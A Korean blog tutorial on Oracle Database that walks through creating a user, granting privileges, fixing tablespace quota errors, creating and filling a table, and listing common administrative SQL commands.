<hr />
<ul>
  <li>DB 서버가 통합된 하나의 스토리지를 공유하는 방식이다.</li>
  <li>오라클 db 는 mysql 과 달리 데이터 베이스를 만드는 것이 아닌 사용자를 만들고 권한을 부여한다.</li>
  <li>사용자 중심으로 테이블을 관리한다.</li>
</ul>

<h4 id="oracle-사용자-생성">Oracle 사용자 생성</h4>
<ol>
  <li><code class="language-plaintext highlighter-rouge">su - oracle</code> 명령을 이용하여 <code class="language-plaintext highlighter-rouge">oracle</code> 사용자로 전환한다.<br /><img src="https://user-images.githubusercontent.com/31990118/230787698-796c4b78-52ec-44f4-a291-4b01c4ad5faa.png" alt="Pasted image 20230409214824" /></li>
  <li><code class="language-plaintext highlighter-rouge">sqlplus / as sysdba</code> 명령을 통해 <code class="language-plaintext highlighter-rouge">SQL</code> 창으로 들어가자.<br /><img src="https://user-images.githubusercontent.com/31990118/230787719-e9f09ac1-7b75-45ac-a3ff-199c2c39eabf.png" alt="Pasted image 20230409220051" /></li>
  <li><code class="language-plaintext highlighter-rouge">CREATE USER "사용자명" identified by "비번"</code> 명령을 <code class="language-plaintext highlighter-rouge">SQL</code> 창에 입력하여 사용자를 생성한다.</li>
  <li>여기서 <code class="language-plaintext highlighter-rouge">ORA-65096: 공통 사용자 또는 롤 이름이 부적합합니다.</code> 라는 오류가 발생 한다면 사용자명 앞에 <code class="language-plaintext highlighter-rouge">c##</code> 또는 <code class="language-plaintext highlighter-rouge">C##</code> 을 붙여야한다.<br /><code class="language-plaintext highlighter-rouge">CREATE USER "c##사용자명" identified by "비번"</code></li>
  <li><code class="language-plaintext highlighter-rouge">select username from dba_users;</code> 명령을 <code class="language-plaintext highlighter-rouge">SQL</code> 창에 입력하여 새로 만든 계정을 확인할 수 있다.</li>
  <li>새로 만든 계정에 접속할려고 하면 권한이 없다는 에러가 발생한다. <code class="language-plaintext highlighter-rouge">SYS</code> 계정으로 먼저 연결한 다음 권한을 부여해줘야 한다.<br /><script src="https://gist.github.com/MinGyu2/61b386bb2045be5bab0eb3a64d866805.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">conn 사용자명</code> 을 <code class="language-plaintext highlighter-rouge">SQL</code> 창에 입력하여 새로 만든 계정으로 접속한다.<br /><script src="https://gist.github.com/MinGyu2/0b46dde8c67e9a3284935fc95b687727.js"></script></li>
  <li>테이블 생성을 해보자. 밑에는 예시 테이블이다.<br /><script src="https://gist.github.com/MinGyu2/f291c98972b64cb9d9daec3a05fcc7f6.js"></script></li>
  <li>생성한 테이블을 확인하자. <code class="language-plaintext highlighter-rouge">TEST</code> 라는 테이블이 만들어진 것을 확인할 수 있다.<br /><script src="https://gist.github.com/MinGyu2/dd0fc152241100f36b8990e5178f81e5.js"></script></li>
  <li>생성한 테이블에 데이터를 넣어보자.<br /><script src="https://gist.github.com/MinGyu2/d5ae11104c21b190b8a6ce0df9ba96b5.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">ORA-01950: 테이블스페이스 'USERS'에 대한 권한이 없습니다.</code> 오류가 발생하였다.  해당 에러는 <code class="language-plaintext highlighter-rouge">users</code> 테이블스페이스에서 얼마만큼의 영역을 할당한것인지 정해지지 않은 상태이기 때문이다. 해결 방법은 해당 테이블스페이스에 대해 공간을 할당해 주면된다.<br /><script src="https://gist.github.com/MinGyu2/409ec5c72c8b7b53f90d89e9c8e466c7.js"></script><br /><script src="https://gist.github.com/MinGyu2/8ad5b5aa792babb467fa0fe44f2a48f1.js"></script></li>
  <li>이제 다시 <code class="language-plaintext highlighter-rouge">insert</code> 명령어로 데이터를 넣어보자.<br /><script src="https://gist.github.com/MinGyu2/e10317d95ba51c0efc4475e4325788b6.js"></script></li>
  <li>테이블에 잘 들어갔는지 확인해 보자. 데이터가 db에 잘 들어갔다.<br /><script src="https://gist.github.com/MinGyu2/9278303018b0d0298a546647843f12d2.js"></script></li>
</ol>

<h3 id="oracle-db-명령어">Oracle DB 명령어</h3>
<hr />
<ul>
  <li><code class="language-plaintext highlighter-rouge">show user</code> : 현재 접속중인 유저를 알 수 있다.</li>
  <li><code class="language-plaintext highlighter-rouge">SELECT * FROM tab;</code> : 현재 계정의 테이블 목록 조회하기.</li>
  <li><code class="language-plaintext highlighter-rouge">select * from all_users;</code> : 계정 정보들 확인하기.</li>
  <li><code class="language-plaintext highlighter-rouge">SELECT owner FROM dba_tables WHERE table_name= '테이블명';</code> : 테이블 소유자가 누구인지 확인할 수 있다. 단 <code class="language-plaintext highlighter-rouge">SYS</code> 유저로 접속한다음 이 명령어를 사용해야 한다.</li>
  <li><code class="language-plaintext highlighter-rouge">CREATE USER 사용자명 IDENTIFIED BY 암호;</code> : 사용자 생성.</li>
  <li><code class="language-plaintext highlighter-rouge">ALTER USER 사용자명 IDENTIFIED BY 새로운 암호;</code> : 사용자 비밀번호 변경.</li>
  <li><code class="language-plaintext highlighter-rouge">DROP USER 사용자명 CASCADE;</code> : 사용자 삭제.</li>
  <li><code class="language-plaintext highlighter-rouge">grant 권한,권한2,.. to 계정명;</code> : 권한 부여하기.</li>
  <li><code class="language-plaintext highlighter-rouge">revoke 권한,권한2,.. from 계정명;</code> : 권한 회수하기(취소하기).</li>
  <li><code class="language-plaintext highlighter-rouge">commit;</code> : 지금 까지의 변경 사항들 적용하기.</li>
  <li><code class="language-plaintext highlighter-rouge">select * from DBA_ROLE_PRIVS WHERE GRANTEE = 사용자명(대문자);</code> : 사용자에게 부여된 권한들을 확인할 수 있다.</li>
  <li><code class="language-plaintext highlighter-rouge">delete from 테이블명;</code> : 테이블의 모든 행을 삭제한다.</li>
  <li><code class="language-plaintext highlighter-rouge">drop table 테이블명;</code> : 테이블을 삭제한다. 정확히는 휴지통으로 보낸다.</li>
  <li><code class="language-plaintext highlighter-rouge">drop table 테이블 이름 purge;</code> : 휴지통으로 보내지 않고 테이블을 완전 삭제 한다.</li>
  <li><code class="language-plaintext highlighter-rouge">show recyclebin;</code> : 휴지통의 테이블들 조회.</li>
  <li><code class="language-plaintext highlighter-rouge">FLASHBACK TABLE 테이블 이름 TO BEFORE DROP;</code> : 휴지통의 테이블 복원.</li>
  <li><code class="language-plaintext highlighter-rouge">PURGE RECYCLEBIN;</code> : 휴지통 비우기.</li>
  <li><code class="language-plaintext highlighter-rouge">PURGE TABLE 테이블 이름;</code> : 휴지통에서 특정 테이블만 삭제.</li>
  <li><code class="language-plaintext highlighter-rouge">PURGE DBA_RECYCLEBIN;</code> : DBA 권한으로 휴지통 내 테이블 전체 삭제.</li>
  <li><code class="language-plaintext highlighter-rouge">select status from v$instance;</code> : 현재 DB 상태 확인하기.</li>
  <li><code class="language-plaintext highlighter-rouge">DELETE FROM 테이블명 WHERE 조건;</code> : 테이블에 있는 조건에 맞는 행을 삭제한다.</li>
</ul>

<p><br /><br /></p>
<details>
<summary>
참고 사이트 목록
</summary>
<h3 id="참고-사이트">참고 사이트<a class="header-link" href="#참고-사이트" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h3>
<ul>
  <li><a href="https://www.centlinux.com/2022/06/install-oracle-database-21c-xe-on-rocky-linux.html">Install Oracle Database 21c XE on Rocky Linux 8 CentLinux</a></li>
  <li><a href="https://boanhack.tistory.com/171">오라클 현재 DB 상태 확인하기</a></li>
  <li><a href="https://coding-factory.tistory.com/413">Oracle ORA-65096: 공통 사용자 또는 롤 이름이 부적합합니다. 에러 해결</a></li>
  <li><a href="https://gent.tistory.com/528">Oracle 사용자 생성 및 삭제 방법 (Create User) (tistory.com)</a></li>
  <li><a href="https://sgcomputer.tistory.com/247">Oracle 오라클 기본 - 데이터 베이스 만들기(사용자 생성)</a></li>
  <li><a href="https://velog.io/@alicesykim95/Oracle%EA%B3%BC-MySQL%EC%9D%98-%EC%B0%A8%EC%9D%B4%EC%A0%90">Oracle과 MySQL의 차이점 </a></li>
  <li><a href="https://streamls.tistory.com/entry/Oracle-%EC%84%A4%EC%B9%98-%ED%9B%84-%EA%B3%84%EC%A0%95-%EC%83%9D%EC%84%B1-%EB%B0%8F-%ED%85%8C%EC%9D%B4%EB%B8%94-%EC%83%9D%EC%84%B1">Oracle 설치 후 계정 생성 및 테이블 생성</a></li>
  <li><a href="https://endorphin0710.tistory.com/28">오라클 현재 작업중인 유저 확인하기</a></li>
  <li><a href="https://yjy0755.tistory.com/22">새로운 계정을 만들어 테이블 만들어보기 </a></li>
  <li><a href="https://holics1226.tistory.com/16">ORA-01045 (로그인 실패/권한 부족)</a></li>
  <li><a href="https://www.oracletutorial.com/oracle-administration/oracle-show-tables/">Oracle Show Tables: List Tables in Oracle Database (oracletutorial.com)</a></li>
  <li><a href="https://jink1982.tistory.com/33">Oracle 데이터 입력(INSERT), 조회(SELECT), UPDATE(수정), DELETE(삭제)</a></li>
  <li><a href="https://gogogameboy.tistory.com/entry/oracle-sql-select2">오라클 SQL, SELECT문 특정 열 선택 </a></li>
  <li><a href="https://gent.tistory.com/407">오라클 INSERT 방법 &amp; 노하우 정리 (데이터 입력)</a></li>
  <li><a href="https://dololak.tistory.com/756"> 오라클 ORA-01950: 테이블스페이스 ‘USERS’에 대한 권한이 없습니다 오류 해결 방법</a></li>
  <li><a href="https://m.blog.naver.com/cksgy32/221675944029">SQLD ORA-01950: 테이블스페이스 ‘USERS’에 대한 권한이 없습니다.</a></li>
  <li><a href="https://hengbokhan.tistory.com/78">Oracle BIN$…형식의 테이블 완전히 삭제하기</a></li>
  <li><a href="https://bangu4.tistory.com/320">오라클 계정,권한 관리 (tistory.com)</a></li>
  <li><a href="https://m.blog.naver.com/deersoul6662/221466474481">oracle 모든 유저, 데이터 베이스, 테이블 확인 : 네이버 블로그 (naver.com)</a></li>
  <li><a href="https://ajdahrdl.tistory.com/2">Oracle 계정 생성 및 권한 부여 방법 (tistory.com)</a></li>
  <li><a href="https://loghada.tistory.com/4">Oracle DB 계정 생성/사용자 확인</a></li>
  <li><a href="https://www.ibm.com/docs/ko/i/7.1?topic=language-removing-rows-from-table-using-delete-statement">DELETE문을 사용하여 테이블에서 행 제거 - IBM Documentation</a></li>
</ul>
</details>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="Database" /><summary type="html"><![CDATA[오라클 db로 계정 생성, 테이블 생성, 데이터 삽입을 해보자.]]></summary></entry></feed>